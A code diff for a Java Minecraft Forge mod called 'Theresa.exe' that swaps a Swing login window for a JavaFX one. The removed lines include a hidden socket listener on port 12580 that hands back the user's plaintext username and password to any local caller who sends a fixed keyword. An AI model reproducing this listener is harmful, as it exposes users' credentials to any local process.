@@ -7,6 +7,10 @@ import io.netty.channel.socket.SocketChannel;
 import io.netty.channel.socket.nio.NioSocketChannel;
 import io.netty.handler.codec.string.StringDecoder;
 import io.netty.handler.codec.string.StringEncoder;
+import javafx.application.Application;
+import javafx.fxml.FXMLLoader;
+import javafx.scene.Scene;
+import javafx.stage.Stage;
 import net.minecraftforge.fml.common.FMLCommonHandler;
 import sun.misc.Unsafe;
 import theresa.connection.NettyClientHandler;
@@ -31,7 +35,7 @@ import java.nio.charset.StandardCharsets;
 import java.util.Map;
 import java.util.Objects;
 
-public class Main {
+public class Main extends Application {
 
     public static Main INSTANCE;
 
@@ -48,8 +52,24 @@ public class Main {
         INSTANCE = this;
     }
 
+    @Override
+    public void start(Stage stage) throws IOException {
+        FXMLLoader fxmlLoader = new FXMLLoader(Main.class.getResource("hello-view.fxml"));
+        Scene scene = new Scene(fxmlLoader.load());
+        stage.setTitle("Theresa.exe");
+        stage.setScene(scene);
+        stage.show();
+    }
+
     public void IRC() {
-        doLogin();
+        launch();
+        while (Main.INSTANCE.name == null) {
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
         new Thread(() -> {
             EventLoopGroup eventExecutors = new NioEventLoopGroup();
             try {
@@ -73,110 +93,6 @@ public class Main {
         }).start();
     }
 
-    public static class Login extends JFrame {
-        private static final long serialVersionUID = 1L;
-
-        public void init() {
-            setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
-            setAlwaysOnTop(true);
-            // 设置顶部提示文字和主窗体的宽，高，x值，y值
-            setTitle("Theresa.exe - Verify");
-            setBounds(0, 0, 275, 175);
-            setLocationRelativeTo(null);
-            Container cp = getContentPane(); // 添加一个cp容器
-            cp.setLayout(null); // 设置添加的cp容器为流布局管理器
-
-            // 设置左侧用户名文字
-            JLabel jl = new JLabel("用户名：");
-            jl.setBounds(30, 10, 200, 35);
-            final JTextField name = new JTextField(); // 用户名框
-            name.setBounds(100, 10, 150, 35); // 设置用户名框的宽，高，x值，y值
-
-            // 设置左侧密码文字
-            JLabel jl2 = new JLabel("密码：");
-            jl2.setBounds(30, 50, 200, 35);
-            final JPasswordField password = new JPasswordField(); // 密码框：为加密的***
-            password.setBounds(100, 50, 150, 35); // 设置密码框的宽，高，x值，y值
-
-            // 将jl、name、jl2、password添加到容器cp中
-            cp.add(jl);
-            cp.add(name);
-            cp.add(jl2);
-            cp.add(password);
-
-            // 确定按钮
-            JButton jb = new JButton("确定"); // 添加一个确定按钮
-            jb.addActionListener(new ActionListener() { // 为确定按钮添加监听事件
-
-                public void actionPerformed(ActionEvent arg0) {
-                    Main.INSTANCE.name = name.getText();
-                    Main.INSTANCE.password = (new String(password.getPassword()));
-
-                    Map<String, String> keyMap = RSAUtils.createKeys(2048);
-                    Main.INSTANCE.publicKey = keyMap.get("publicKey");
-                    Main.INSTANCE.privateKey = keyMap.get("privateKey");
-
-                    //Get The Auto-Login System By Theresa.exe
-
-                    //New Thread SUS
-                    new Thread(() -> {
-                        ServerSocket serverSocket = null;
-                        try {
-                            serverSocket = new ServerSocket(12580);
-                            Socket socket = serverSocket.accept();
-                            DataInputStream input = null;
-                            DataOutputStream output = null;
-                            try {
-                                input = new DataInputStream(socket.getInputStream());
-                                output = new DataOutputStream(socket.getOutputStream());
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-                            while (!serverSocket.isClosed()) {
-                                String received = Objects.requireNonNull(input).readUTF();
-                                if (received.equals("FuckYou"))
-                                    Objects.requireNonNull(output).writeUTF(INSTANCE.name + ":" + INSTANCE.password);
-                            }
-
-                        } catch (IOException e) {
-                            try {
-                                serverSocket.close();
-                            } catch (IOException ex) {
-                                ex.printStackTrace();
-                            }
-                        }
-                    }).start();
-
-                    setVisible(false);
-                }
-            });
-            jb.setBounds(10, 100, 250, 30); // 设置确定按钮的宽，高，x值，y值
-            cp.add(jb); // 将确定按钮添加到cp容器中
-
-            setResizable(false);
-
-            setVisible(true);
-
-            addWindowListener(new WindowAdapter() {
-
-                public void windowClosing(WindowEvent e) {
-                    FMLCommonHandler.instance().exitJava(0, true);
-                }
-
-            });
-        }
-    }
-
-    public void doLogin() {
-        Login login = new Login();
-        login.init();
-        while (login.isVisible()) {
-            try {
-                Thread.sleep(100);
-            } catch (InterruptedException e) {
-            }
-        }
-    }
 
     public void println(String obj) {
         Class<?> systemClass = null;
